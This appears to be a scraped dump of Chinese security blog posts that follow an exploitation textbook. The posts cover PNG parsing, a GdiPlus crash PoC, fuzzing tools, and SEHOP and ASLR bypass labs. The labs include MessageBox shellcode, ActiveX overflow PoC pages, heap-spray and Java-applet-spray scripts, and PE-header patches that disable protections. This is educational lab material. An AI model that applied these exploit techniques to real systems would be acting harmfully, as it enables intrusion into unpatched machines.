if(file.header.version == 2) byte data[len]; } record[file.header.numRecords]; } file; 3.3 010脚本编写提高——PNG文件解析首先定义PNG签名和Chunk两种结构，PNG文件签名： const uint64 PNGMAGIC = 0x89504E470D0A1A0AL; 然后是PNG的Chunk格式: typedef struct{ uint32 length; char ctype[4]; ubyte data[length]; uint32 crc &lt;format=hex&gt;; } CHUNK 还需定义CHUNK结构体的read函数，以便在显示解析结果时能够给出每个Chunk的名字，显然ctype的值可以作为Chunk的名字。在ctype中，每个字节的第三位还分别标识了该Chunk的一些附加信息： 位置 1 0 第1字节的第3位 Ancillary Critical 第2字节的第3位 Private Public 第3字节的第3位 ERROR_RESERVED 第4字节的第3位 Safe to Copy UnSafe to Copy 说明: Ancillary标识该区块是辅助区块，该区块可有可无；Critical表示该区块是关键区块，这些区块是必须的 Private表示该区块是不在PNG标准规格(PNG specification)区块中，属于该PNG文件私有，其名称的第二个字母是小写；Public表示该区块属于PNG标准区块，其名称的第二个字母是大写。 Safe to Copy表示该区块与图像数据无关，可以随意复制到改动过的PNG文件中；Unsafe to Copy表示该区块内容与图像数据息息相关，如果对文件的Critical区块进行了增删改等操作，则该区块也需要进行相应的修改 于是CHUNK结构定义如下函数： string readCHUNK(local CHUNK &c){ local string s; s = c.ctype + \" (\"; s += (c.ctype[0] & 0x20) ? \"Ancillary, \" : \"Critical, \"; s += (c.ctype[1] & 0x20) ? \"Private, \" : \"Public, \"; s += (c.ctype[2] & 0x20) ? \"ERROR_RESERVED, \" : \"\"; s += (c.ctype[3] & 0x20) ? \"Safe to Copy)\" : \"Unsafe to Copy)\"; return s; } 同时在定义好的CHUNK结构体后加上read属性，即把“} CHUNK;”改为: } CHUNK &lt;read=readCHUNK&gt; 最后写入解析&quot;主函数&quot;: uint64 pngid &lt;format=hex&gt;; if(pngid != PNGMAGIC){ Warning(\"Invalid PNG File: Bad Magic Number\"); return -1; } while(!FEof()){ CHUNK chunk; } 另外，由于PNG文件是按照BigEndian格式进行存储的，所以需要在脚本的第一行加入: BigEndian(); 漏洞 实验环境操作系统： Win XP SP3GdiPlus.dll版本： 5.1.3102.5512 在之前的PNG解析结果中找到IHDR Chunk的length位置，也就是第9-12字节，通常情况下其值为13(0x0D)，现在换成0xFFFFFFF4，并将文件另存为poc.png。在实验环境下打开poc.png，打开资源管理器，会发现explorer.exe的CPU占用率升至100%，使系统接近宕机状态，只有强行结束或者重启explorer.exe进程才能使系统恢复正常。 实际上gdiplus.dll在处理IHDR时存在整数溢出漏洞。该漏洞的危害： 打开poc.png或者打开poc.png所在文件夹的未打补丁的用户死机 将poc.png挂载某网页上，访问该页面的未打补丁用户死机 设为QQ或MSN头像，查看头像的未打补丁用户死机 3.4 PPT文件解析office系列软件使用的文件格式分为两个：Office97~Office2003：使用基于二进制的文件格式，文件名后缀为doc、ppt、xls等Office2003及更高版本：使用基于XML的文件格式，文件名后缀为docx、pptx、xlsx等。 本节以PowerPoint97~2003所用的二进制文件格式，PPT文件的解析过程从逻辑上分为如下四层： 测试深度 解析逻辑 数据粒度 Fuzz方法 Level1 OLE2 解析器 离散分布的512字节数据段 修改OLE文件头、FAT区块、目录区块等位置的数据结构 Level2 PPT 记录解析器 流和信息库 修改流中的数据，破坏记录头和数据的关系 Level3 PPT 对象创建器 原子和容器 用负载替换原子数据 Level4 PPT 对象内部逻辑 原子记录内部的integer、bool、string等类型数据 用相关的负载修改字节数据","tags":[{"name":"fuzz","slug":"fuzz","permalink":"http://yoursite.com/tags/fuzz/"}]},{"title":"漏洞挖掘技术简介","date":"2017-07-28T05:58:56.000Z","path":"2017/07/28/漏洞挖掘技术简介/","text":"1. 漏洞挖掘概述1.1 Fuzz测试这是一种黑盒测试，与基于功能性的测试有所不同，Fuzz主要目的是&quot;crash&quot;、&quot;break&quot;、&quot;destroy&quot;。 Fuzz的测试用例往往是带有攻击性的畸形数据，用以触发各种类型的漏洞。 Fuzz测试的优点：很少出现误报，能够快速找到真正的漏洞Fuzz测试的缺点：永远不能保证系统中已经没有漏洞 1.2 学术界与工业界的区别学术界偏向于对源代码进行静态分析，直接在程序的逻辑上寻找漏洞。方法和理论有：(可追溯于1976年在ACM Computing Surveys上的论文Data Flow Analysis Software Reliability) 数据流分析 类型验证系统 边界检验系统 状态机系统等 1.3 审计源代码的工具 Fortify在编译阶段扫描若干安全风险 Rough Auditing Tool for Security(RATS)用于分析C/C++语言的语法树，寻找存在潜在安全问题的函数调用 BEAM(Bugs Errors And Mistakes)，IBM的静态代码分析工具，使用数据楼分析的方法，分析源代码的所有可执行路径，以检测代码中潜在的bug SLAM用于检测驱动中的bug Flaw Finder用Python语言开发的代码分析工具 Prexis可审计多种语言的源代码，审计的漏洞类型超过30种 2. 动态测试技术2.1 SPIKESPIKE是Protocol Fuzz(针对网络协议的模糊测试)工具 spike运行在linux环境下，当然对代码进行一定的修改之后就可以运行在windows上。Dave Aitel实现了一套功能强大的API和数据结构用于定义数据块。SPIKE就是这样一套函数与数据结构的集合。 Hello World用例： 2.2 beSTORM简介由Beyond Security安全公司开发，运行在windows上的一款全能型安全审计程序，其利用模糊测试技术实现对网络协议的安全测试。 3. 静态代码审计Coverity是用来提高软件质量的源代码静态分析工具。Coverity使用checker模块来检测漏洞，默认情况下的checker包括： C checkers，内存错误、缓冲区溢出、函数的参数及返回值 Concurrency checkers，线程同步、锁机制等 Security checker，可信数据流的分析、字符串溢出等 所有静态代码分析的理论和技术都面临的棘手问题：如何处理程序逻辑中由动态因素引起的复杂条件分支和循环","tags":[]},{"title":"攻击SEHOP的方法","date":"2017-07-18T05:40:19.000Z","path":"2017/07/18/攻击SEHOP的方法/","text":"1. 攻击返回地址如果程序启用了SEHOP但是未启用GS，或者启用了GS但是刚好被攻击的函数没有GS保护，那么就可以供给函数的返回地址！ 2. 攻击虚函数SEHOP保护的只是SEH，对于SEH以外的不提供保护。所以我们可以通过攻击虚函数来劫持程序流程，这个过程不涉及任何异常处理。 3. 利用未启用SEHOP的模块出于兼容性的考虑，对一些程序禁用了SEHOP，如经过Armadilo加壳的软件。 操作系统会根据PE头MajorLinkerVersion和MinorLinkerVersion两个选项来判断是否为程序禁用SEHOP。可以将这两个选项设置为0x53和0x52来模拟经过Armadilo加壳的程序，从而达到禁用SEHOP的目的！ 此处是通过CFF Explorer来进行这种处理 3.1 实验代码3.2 实验内容实验环境 推荐使用的环境 备注 操作系统 windows 7 EXE编译器 Visual Studio 2008 DLL编译器 VC++ 6.0 将dll基址设置为0x11120000 系统SEHOP 启用 秩序DEP 关闭 程序ASLR EXE随意，DLL禁用 编译选项 禁用优化选项 build版本 release版本 windows 7 下的弹出对话框的shellcode char shellcode[] = \"\\xFC\\x68\\x6A\\x0A\\x38\\x1E\\x68\\x63\\x89\\xD1\\x4F\\x68\\x32\\x74\\x91\\x0C\" \"\\x8B\\xF4\\x8D\\x7E\\xF4\\x33\\xDB\\xB7\\x04\\x2B\\xE3\\x66\\xBB\\x33\\x32\\x53\" \"\\x68\\x75\\x73\\x65\\x72\\x54\\x33\\xD2\\x64\\x8B\\x5A\\x30\\x8B\\x4B\\x0C\\x8B\" \"\\x49\\x1C\\x8B\\x09\\x8B\\x09\\x8B\\x69\\x08\\xAD\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\x05\\x95\" \"\\xFF\\x57\\xF8\\x95\\x60\\x8B\\x45\\x3C\\x8B\\x4C\\x05\\x78\\x03\\xCD\\x8B\\x59\" \"\\x20\\x03\\xDD\\x33\\xFF\\x47\\x8B\\x34\\xBB\\x03\\xF5\\x99\\x0F\\xBE\\x06\\x3A\" \"\\xC4\\x74\\x08\\xC1\\xCA\\x07\\x03\\xD0\\x46\\xEB\\xF1\\x3B\\x54\\x24\\x1C\\x75\" \"\\xE4\\x8B\\x59\\x24\\x03\\xDD\\x66\\x8B\\x3C\\x7B\\x8B\\x59\\x1C\\x03\\xDD\\x03\" \"\\x2C\\xBB\\x95\\x5F\\xAB\\x57\\x61\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\xA9\\x33\\xDB\" \"\\x53\\x68\\x77\\x65\\x73\\x74\\x68\\x66\\x61\\x69\\x6C\\x8B\\xC4\\x53\\x50\\x50\" \"\\x53\\xFF\\x57\\xFC\\x53\\xFF\\x57\\xF8\"; 上面代码中的红字是与xp和window 2000中不同的shellcode之处，其指代的意思是mov ecx, [ecx]之所以在此处多加这一句，是因为ntdll.dll链的下一个为KERNELBASE.dll，而它下一个才是kernel32.dll，这也是win7与之前的系统的不同之处！ 本次实验是在&quot;利用未启用SafeSEH模块&quot;实验的基础上进行的 win7中关闭DEP的方法：cmd窗口中bcdedit.exe/set {current} nx AlwaysOff pause 首先为SEH_NOSafeSEH_JUMP.dll禁用SEHOP，使用CFF Explorer打开SEH_NOSafeSEH_JUMP.dll后在Optional header选项页中来进行设置，分别将MajorLinkerVersion和MinorLinkerVersion设置为0x53和0x52。这个如上图 然后对演示的主程序进行一定的修改： 修改弹出对话框的shellcode，让其可以在windows 7下正常弹出 取消程序的/NXCOMPAT链接选项来禁用程序的DEP 不知道什么原因，到目前为止，我还没有实现弹出对话框的效果 4. 伪造SEH链表伪造SEH是非常困难的，首先需要系统的ASLR不能启用，因为伪造SEH链时需要用到FinalExceptionHandler指向的地址，如果每次系统重启后这个地址都变化的话，溢出的成功率将大大降低。 4.1 实验代码4.2 实验内容伪造SEH链绕过SEHOP所需的条件： 下图中的0xXXXXXXXX地址必须指向当前栈中，而且必须能够被4整除 0xXXXXXXXX处存放的异常处理记录作为SEH链的最后一项，其异常处理函数指针必须指向终极异常处理函数 突破SEHOP检查后，溢出程序还需搞定SafeSEH 为了方便，本实验在&quot;利用未启用SafeSEH模块绕过SafeSEH&quot;的基础上进行，不用考虑SafeSEH问题，只需确定0xXXXXXXXX的值和FinalExceptionHandler指向的地址即可。 实验思路 通过未启用SafeSEH的SEH_NOSafeSEH_JUMP.dll来绕过SafeSEH 通过伪造SEH链，造成SEH链未被破坏的假象来绕过SEHOP SEH_NOSafeSEH中的test函数存在典型的溢出 使用SEH_NOSafeSEH_JUMP.dll中的“pop pop retn”指令地址覆盖异常处理函数地址，然后通过制造除0异常，将程序转入异常处理，通过劫持异常处理流程，程序转入SEH_NOSafeSEH_JUMP.DLL中执行&quot;pop pop retn&quot;指令，在执行retn后程序转入shellcode执行 实验环境 推荐使用的环境 备注 操作系统 windows 7 EXE编译器 Visual Studio 2008 DLL编译器 VC++ 6.0 将dll基址设置为0x11120000 系统SEHOP 启用 秩序DEP 关闭 程序ASLR 关闭 编译选项 禁用优化选项 build版本 release版本","tags":[{"name":"windows","slug":"windows","permalink":"http://yoursite.com/tags/windows/"},{"name":"SEH","slug":"SEH","permalink":"http://yoursite.com/tags/SEH/"}]},{"title":"SEHOP原理","date":"2017-07-17T10:48:47.000Z","path":"2017/07/17/SEHOP原理/","text":"1. SEHOP简介SEHOP(Structured Exception Handling Overwrite Protection)是一种比SafeSEH更为严厉的保护机制。截至2009年，Windows Vista SP1、Windows 7、Windows Server 2008和Windows Server 2008 R2均支持SEHOP。 SEHOP在Windows Server 2008是默认启用，而在Windows Vista和Windows 7中SEHOP默认是关闭的，可以通过下面两种方法启用SEHOP： 手工在注册表中HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session\\Manager\\kernel下面找到DisableExceptionChainValidation项，将其值设置为0，即可以启用SEHOP SEHOP的核心任务是检查这条SEH链的完整性，在程序转入异常处理前SEHOP会检查SEH链上最后一个异常处理函数是否为系统固定的终极异常处理函数。如果是，则说明这条SEH链没有被破坏，程序可以执行当前的异常处理函数；如果检测到最后一个异常处理函数不是最终的默认异常处理，则说明SEH链被破坏，可能发生了SEH覆盖攻击，程序将不会去执行当前的异常处理函数。 验证代码如下： BOOL RtlIsValidHandler(handler) { if (handler is in an image) { if (image has the IMAGE_DLLCHARACTERISTICS_NO_SEH flag set) return FALSE; if (image has a SafeSEH table) if (handler found in the table) return TRUE; else return FALSE; if (image is a .NET assembly with the ILonly flag set) return FALSE; // fall through } if (handler is on a non-executable page) { if (ExecuteDispatchEnable bit set in the process flags) return TRUE; else // enforce DEP even if we have no hardware NX raise ACCESS_VIOLATION; } if (handler is not in an image) { if (ImageDispatchEnable bit set in the process flags) return TRUE; else return FALSE; // don't allow handlers outside of images } // everything else is allowed return TRUE; } [...] // Skip the chain validation if the DisableExceptionChainValidation bit is set if (process_flags & 0x40 == 0) { // Skip the validation if there are no SEH records on the // linked list if (record != 0xFFFFFFFF) { // Walk the SEH linked list do { // The record must be on the stack if (record < stack_bottom || record > stack_top) goto corruption; // The end of the record must be on the stack if ((char*)record + sizeof(EXCEPTION_REGISTRATION) > stack_top) goto corruption; // The record must be 4 byte aligned if ((record & 3) != 0) goto corruption; handler = record->handler; // The handler must not be on the stack if (handler >= stack_bottom && handler < stack_top) goto corruption; record = record->next; } while (record != 0xFFFFFFFF); // End of chain reached // Is bit 9 set in the TEB->SameTebFlags field? // This bit is set in ntdll!RtlInitializeExceptionChain, // which registers FinalExceptionHandler as an SEH handler // when a new thread starts. if ((TEB->word_at_offset_0xFCA & 0x200) != 0) { // The final handler must be ntdll!FinalExceptionHandler if (handler != &FinalExceptionHandler) goto corruption; } } } 2. 攻击SEHOP的理论方法作为对SafeSEH强有力的补充，SEHOP检查是在SafeSEH的RtlIsValidHandler函数校验前进行的，也就是说利用攻击加载模块之外的地址、堆地址和未启用SafeSEH模块的方法都行不通了。理论上还有三条路可以： 不去攻击SEH，而是攻击函数返回地址或者虚函数等 利用未启用SEHOP的模块 伪造SEH链","tags":[{"name":"windows","slug":"windows","permalink":"http://yoursite.com/tags/windows/"},{"name":"SEH","slug":"SEH","permalink":"http://yoursite.com/tags/SEH/"}]},{"title":"攻击ASLR的方法","date":"2017-07-14T09:31:06.000Z","path":"2017/07/14/攻击ASLR的方法/","text":"攻击ASLR的方式很多，这里主要讲攻击未启用ASLR的模块、利用部分覆盖进行定位内存地址、利用Heap Spray技术定位内存地址、利用java applet heap spray技术定位内存地址、为.NET控件禁用ASLR 1. 攻击未启用ASLR的模块ASLR仅仅只是安全机制，不是行业标准，不支持ASLR的软件很多，它们的加载基址固定，如果能够在当前控件中找到这样的模块，就可以利用它里面的指令作跳板，无视ASLR。Adobe Player ActiveX9就不支持ASLR。 我们可以使用下面的方式测试： 具有溢出漏洞的ActiveX控件 不启用ASLR的Flash9e.ocx 可以触发ActiveX控件溢出漏洞的POC页面 1.1 ActiveX、POC代码 void CVulnerAXCtrl::test(LPCTSTR str) { // AFX_MANAGE_STATE(AfxGetStaticModuleState()); // TODO: Add your dispatch handler code here printf(\"aaaa\"); char dest[100]; sprintf(dest, \"%s\", str); } 这里面有一个巨大的坑点，就是在vista上安装好了adobe player activex 9之后，需要重启，否则在IE上打不开map.swf文件 POC.html &lt;html&gt; &lt;body&gt; &lt;object classid=\"clsid:D27CDB6E-AE6D-11cf-96B8-444553540000\" codebase=\"http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=9,0,115,0\" width=\"160\" height=\"260\"&gt; &lt;param name=\"movie\" value=\"map.swf\" /&gt; &lt;param name=\"quality\" value=\"high\" /&gt; &lt;embed src=\"map.swf\" quality=\"high\" pluginspage=\"http://www.adobe.com/shockwave/download/download.cgi?P1_Prod_Version=ShockwaveFlash\" type=\"application/x-shockwave-flash\" width=\"160\" height=\"260\"&gt;&lt;/embed&gt; &lt;/object&gt; &lt;object classid=\"clsid:2554812E-4AE1-4FB0-8F6B-9C5E824D1B2D\" id=\"test\"&gt;&lt;/object&gt; &lt;script&gt; var s = \"\\u9090\"; while (s.length &lt; 54) { s += \"\\u9090\"; } s += \"\\uEC2F\\u3015\\u9090\\u9090\"; s += \"\\u68fc\\u0a6a\\u1e38\\u6368\\ud189\\u684f\\u7432\\u0c91\\uf48b\\u7e8d\\u33f4\\ub7db\\u2b04\\u66e3\\u33bb\\u5332\\u7568\\u6573\\u5472\\ud233\\u8b64\\u305a\\u4b8b\\u8b0c\\u1c49\\u098b\\u698b\\uad08\\u6a3d\\u380a\\u751e\\u9505\\u57ff\\u95f8\\u8b60\\u3c45\\u4c8b\\u7805\\ucd03\\u598b\\u0320\\u33dd\\u47ff\\u348b\\u03bb\\u99f5\\ube0f\\u3a06\\u74c4\\uc108\\u07ca\\ud003\\ueb46\\u3bf1\\u2454\\u751c\\u8be4\\u2459\\udd03\\u8b66\\u7b3c\\u598b\\u031c\\u03dd\\ubb2c\\u5f95\\u57ab\\u3d61\\u0a6a\\u1e38\\ua975\\udb33\\u6853\\u6577\\u7473\\u6668\\u6961\\u8b6c\\u53c4\\u5050\\uff53\\ufc57\\uff53\\uf857\"; test.test(s); &lt;/script&gt; &lt;/body&gt; &lt;/html&gt; 1.2 实验内容实验内容 为了直观反映ASLR，本次不是用ActiveX控件不使用GS 通过WEB页面同时加载具有溢出漏洞的ActiveX和Flash9e.ocx 又有IE7和DEP是关闭的，所以不用考虑DEP影响 函数test存在典型的溢出 Flash9k.ocx未启用ASLR，所以其加载地址是固定的，只需要在其内部寻找合适的跳板指令来跳转到shellcode 实验环境 推荐使用环境 备注 操作系统 Windows Vista SP0 DEP状态 Optin Vista默认状态 浏览器 IE7 Flash Player版本 9.0.115 经过某次测试，得到溢出字符串的起始地址0x0337F4B4返回地址所在栈中地址：0x0337F520。所以覆盖返回地址需要填充108个0x90，也即54个\\u9090 书上的解释：我们使用0x1014D286处的MOV EAX,EDX RETN 8来调整EAX，而作为机器码时，其代表：86D2 XCHG DL,DL1410 ADC AL, 10可以看出其不会对正常的程序有影响。接下来用4字节的0x90填充消除test函数返回时的4字节偏移。接着是用0x1012E78A来(JMP ESI)跳转至shellcode跟着是0x90填充 实验测试：0x3015EC2F: jmp esp POC中的第一个classid的值一般不变，对应的cab应该与安装的flash版本一致。第一个object的作用是提前加载swf文件，这样在调试的时候就能看到Flash9e.ocx内容 2. 利用部分覆盖进行定位内存地址映像随机化只会对映像加载基址的前2个字节做随机化处理。 2.1 实验代码 #include \"stdafx.h\" #include \"stdlib.h\" char shellcode[] = \"\\xFC\\x68\\x6A\\x0A\\x38\\x1E\\x68\\x63\\x89\\xD1\\x4F\\x68\\x32\\x74\\x91\\x0C\" \"\\x8B\\xF4\\x8D\\x7E\\xF4\\x33\\xDB\\xB7\\x04\\x2B\\xE3\\x66\\xBB\\x33\\x32\\x53\" \"\\x68\\x75\\x73\\x65\\x72\\x54\\x33\\xD2\\x64\\x8B\\x5A\\x30\\x8B\\x4B\\x0C\\x8B\" \"\\x49\\x1C\\x8B\\x09\\x8B\\x69\\x08\\xAD\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\x05\\x95\" \"\\xFF\\x57\\xF8\\x95\\x60\\x8B\\x45\\x3C\\x8B\\x4C\\x05\\x78\\x03\\xCD\\x8B\\x59\" \"\\x20\\x03\\xDD\\x33\\xFF\\x47\\x8B\\x34\\xBB\\x03\\xF5\\x99\\x0F\\xBE\\x06\\x3A\" \"\\xC4\\x74\\x08\\xC1\\xCA\\x07\\x03\\xD0\\x46\\xEB\\xF1\\x3B\\x54\\x24\\x1C\\x75\" \"\\xE4\\x8B\\x59\\x24\\x03\\xDD\\x66\\x8B\\x3C\\x7B\\x8B\\x59\\x1C\\x03\\xDD\\x03\" \"\\x2C\\xBB\\x95\\x5F\\xAB\\x57\\x61\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\xA9\\x33\\xDB\" \"\\x53\\x68\\x77\\x65\\x73\\x74\\x68\\x66\\x61\\x69\\x6C\\x8B\\xC4\\x53\\x50\\x50\" \"\\x53\\xFF\\x57\\xFC\\x53\\xFF\\x57\\xF8\" \"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\" \"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\" \"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\" \"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\" \"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\" \"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\" \"\\x00\\x30\"; char* test() { char tt[256]; //__asm int 3 memcpy(tt, shellcode, 262); return tt; } int _tmain(int argc, _TCHAR* argv[]) { char temp[200]; test(); return 0; } 2.2 实验内容实验思路 不启用GS 禁用DEP test存在典型的溢出漏洞 复制结束后，test函数返回tt字符数组的首地址 在相对程序加载基址0x0000~0xFFFF的范围内，找到一条跳板指令，并用它地址的后两个字节覆盖返回地址的后两个字节 采用这种“相对寻址”的方法来动态确定跳板指令的地址，以实现跳板指令的通用性 实验环境 推荐使用环境 备注 操作系统 Windows Vista SP0 DEP状态 Optin Vista默认状态 编辑器 Visual Studio 2008 优化选项 禁用优化选项 GS选项 GS关闭 DEP选项 /NXCOMPAT:NO build版本 release 溢出字符串起始地址：0x0016F64C返回地址在栈中地址：0x0016F750 memcpy之后，复制的地址可能不知道，但是复制到哪儿，却是很清楚！ 3. 利用Heap Spray技术定位内存地址3.1 实验代码POC代码 &lt;html&gt; &lt;body&gt; &lt;script&gt; var nops = unescape(\"%u9090%u9090\"); var shellcode = \"\\u68fc\\u0a6a\\u1e38\\u6368\\ud189\\u684f\\u7432\\u0c91\\uf48b\\u7e8d\\u33f4\\ub7db\\u2b04\\u66e3\\u33bb\\u5332\\u7568\\u6573\\u5472\\ud233\\u8b64\\u305a\\u4b8b\\u8b0c\\u1c49\\u098b\\u698b\\uad08\\u6a3d\\u380a\\u751e\\u9505\\u57ff\\u95f8\\u8b60\\u3c45\\u4c8b\\u7805\\ucd03\\u598b\\u0320\\u33dd\\u47ff\\u348b\\u03bb\\u99f5\\ube0f\\u3a06\\u74c4\\uc108\\u07ca\\ud003\\ueb46\\u3bf1\\u2454\\u751c\\u8be4\\u2459\\udd03\\u8b66\\u7b3c\\u598b\\u031c\\u03dd\\ubb2c\\u5f95\\u57ab\\u3d61\\u0a6a\\u1e38\\ua975\\udb33\\u6853\\u6577\\u7473\\u6668\\u6961\\u8b6c\\u53c4\\u5050\\uff53\\ufc57\\uff53\\uf857\"; while (nops.length &lt;0x100000/2) nops += nops; nops = nops.substring(0, 0x100000/2-32/2-4/2-2/2-shellcode.length); nops = nops+shellcode; var memory = new Array(); for (var i=0; i&lt;200; i++) memory[i] += nops; &lt;/script&gt; &lt;object classid=\"clsid:2554812E-4AE1-4FB0-8F6B-9C5E824D1B2D\" id=\"test\"&gt;&lt;/object&gt; &lt;script&gt; var s = \"\\u9090\"; while (s.length &lt; 54){ s += \"\\u9090\"; } s += \"\\u0C0C\\u0C0C\"; test.test(s) &lt;/script&gt; &lt;/body&gt; &lt;/html&gt; 3.2 实验内容利用JS申请200个1MB的内存块，观察内存块的起始地址的变化情况。为了便于确定内存块的起始位置，我们在内存块的开始位置放置0x81828182，然后查找来确定内存块的起始位置！ 由于Heap Spray是针对浏览器的，所以这儿仍然使用ActiveX来进行演示！为了测试，一般将EIP指向0x0C0C0C0C这个位置！！ 实验思路 利用Heap Spray技术在内存中申请200个1MB的内存块来对抗ASLR的随机化处理 每个内存块中包含着0x90填充和shellcode Heap Spray结束后我们会占领0x0C0C0C0C附近的内存，我们只需要控制程序转入0x0C0C0C0C执行，在执行若干个0x90滑行之后就可以到达shellcode范围并执行 test函数存在典型的溢出漏洞，此处用的VulnerAX.ocx中的ActiveX控件 我们将函数返回地址覆盖为0x0C0C0C0C，函数执行返回执行后就会转入我们申请的内存空间中 4. 利用java applet heap spray技术定位内存地址Java applet能绕过DEP，是因为JVM分配Java applet申请的空间时将其申请的空间打上了PAGE_EXECUTE_READWRITE标识，让这段内存具有可执行属性!其实在java applet中可以采用类似Heap spray的方法，在JVM的堆空间中申请大量的内存块来对抗ASLR！与Heap Spray不同的是，Heap Spray最大可申请1GB的空间，而每个Java applet最多能申请100MB的空间。为此我们申请90MB空间！！ 4.1 实验代码AppletSpray.java import java.applet.*; import java.awt.*; public class AppletSpray extends Applet{ public void init(){ String shellcode = \"\\u68fc\\u0a6a\\u1e38\\u6368\\ud189\\u684f\\u7432\\u0c91\\uf48b\\u7e8d\\u33f4\\ub7db\\u2b04\\u66e3\\u33bb\\u5332\\u7568\\u6573\\u5472\\ud233\\u8b64\\u305a\\u4b8b\\u8b0c\\u1c49\\u098b\\u698b\\uad08\\u6a3d\\u380a\\u751e\\u9505\\u57ff\\u95f8\\u8b60\\u3c45\\u4c8b\\u7805\\ucd03\\u598b\\u0320\\u33dd\\u47ff\\u348b\\u03bb\\u99f5\\ube0f\\u3a06\\u74c4\\uc108\\u07ca\\ud003\\ueb46\\u3bf1\\u2454\\u751c\\u8be4\\u2459\\udd03\\u8b66\\u7b3c\\u598b\\u031c\\u03dd\\ubb2c\\u5f95\\u57ab\\u3d61\\u0a6a\\u1e38\\ua975\\udb33\\u6853\\u6577\\u7473\\u6668\\u6961\\u8b6c\\u53c4\\u5050\\uff53\\ufc57\\uff53\\uf857\"; String[] mem = new String[1024]; StringBuffer buffer = new StringBuffer(0x100000/2); // header (12 bytes) nop (0x10000-32-2-x) shellcode(x) NULL(2) for(int i=0;iusDllCharacteristics & IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE) && !(pBinaryInfo->pHeaderInfo->bFlags & PINFO_IL_ONLY_IMAGES) && !(_MmMoveImages == -1)) { _MiNoRelocate++; return 0; } 从代码中可以看出，只要满足下列任意条件就会对PE文件进行随机化处理 PE头含有IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE标识 IL-Only文件，这是对.NET文件进行了特殊照顾 _MmMoveImages 值为-1 由上可以若一个文件是IL-Only文件，无论是否设置了IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE标识，都会随机化加载。而加载到浏览器中的.NET控件恰恰是IL-Only的。 系统验证.NET是否是IL-Only文件过程 if(((pCORHeader->MajorRuntimeVersion>2)|(pCORHeader->MajorRuntimeVerion == 2 && pCORHeader->MinorRuntimeVersion>=5)) && (pCORHeader->Flags & COMIMAGE_FLAGS_ILONLY)) { pImageControlArea->pBinaryInfo->pHeaderInfo->bFlags != PINFO_IL_ONLY_IMAGE; …… } 通过分析代码，可以发现当系统在检查一个.NET文件是否具有COMIMAGE_FLAGS_ILONLY标识前分别对.NET文件运行时版本号进行判断，如果版本号低于2.5则不运行COMIMAGE_FLAGS_ILONLY标识校验，这个文件就不会被认定为IL-Only！ 如果.NET文件被指定加载基址，而其不包含IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE标识，又不被认定为IL-Only，就可以不被ASLR 5.2 实验工具我们可以使用CFF Explorer软件来修改.NET控件的PE头[该软件在吾爱破解工具包中有] 首先去掉文件IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE标识，用CFF Explorer打开DEP_NETDLL.dll后，点击Optional header-&gt;DllCharacteristics进行设置 然后设置.NET控件的运行版本号，修改至小于2.5即可。在.NET Directory选项页中设置，修改完之后保存即可 5.3 实验测试本实验测试沿用利用.NET绕过DEP，不过不同的是本次实验是在Vista上完成的","tags":[{"name":"windows","slug":"windows","permalink":"http://yoursite.com/tags/windows/"},{"name":"ASLR","slug":"ASLR","permalink":"http://yoursite.com/tags/ASLR/"}]},{"title":"内存随机化保护(ASLR)简介","date":"2017-07-14T08:39:22.000Z","path":"2017/07/14/内存随机化保护-ASLR-简介/","text":"ASLR(Address Space Layout Randomization)技术就是通过加载程序的时候不再使用固定的基址加载，从而干扰shellcode定位的一种保护机制。 支持ASLR的程序在其PE头中会设置IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE标识来说明其支持ASLR。从VS 2005 SP1开始加入/dynamicbase链接选项来帮我们完成这个任务。本书使用VS 2008(VS 9.0)中，通过Project-&gt;project Properties-&gt;Configuration Properties-&gt;Linker-&gt;Advanced-&gt;Randomized Base Address选项对/dynamicbase链接选项进行设置。 ASLR一般分为映像随机化、堆栈随机化、PEB与TEB随机化 1. 映像随机化映像随机化是在PE文件映射到内存时，对其加载的虚拟地址进行随机化处理，这个地址在系统启动时确定，系统重启后该地址会变化。 以IE为例 系统中设置了映像随机化的开关，用户可以通过设置注册表中的HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Memory Management\\MoveImages的键值来设定映像随机化的工作模式 0： 映像随机化被禁用 -1： 强制对可随机化的映像进行处理，无论是否设置IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE标识 其他值：正常工作模式，只对具有随机化处理标识的映像进行处理 2. 堆栈随机化在运行时随机的选择堆栈的基址，与映像基址随机化不同的是堆栈的基址不是在系统启动的时候确定的，而是在打开程序的时候确定的 int _tmain(int argc, _TCHAR* argv[]) { char * heap = (char *)malloc(100); char stack[100]; printf(\"Address of heap:%#0.4x\\nAddress of stack %#0.4x\", heap, stack); getchar(); return 0; } 使用win xp和win vista进行对比，如下：win xp两次运行的结果：win vista两次运行的结果： 3. PEB与TEBPEB与TEB随机化在win xp sp2就引入了，不再使用固定的PEB基址0x7FFDF00和TEB基址0x7FFDE00 获取当前进程的TEB和PEB很简单，TEB存放在FS:0和FS:[0x18]处，PEB存放在TEB偏移0x30处的位置。获取TEB、PEB的方法如下： int _tmain(int argc, _TCHAR* argv[]) { unsigned int teb; unsigned int peb; __asm{ mov eax, FS:[0x18] mov teb, eax mov eax, dword ptr [eax + 0x30] mov peb, eax } printf(\"PEB:%#x\\nTEB:%#x\", peb, teb); getchar(); return 0; } 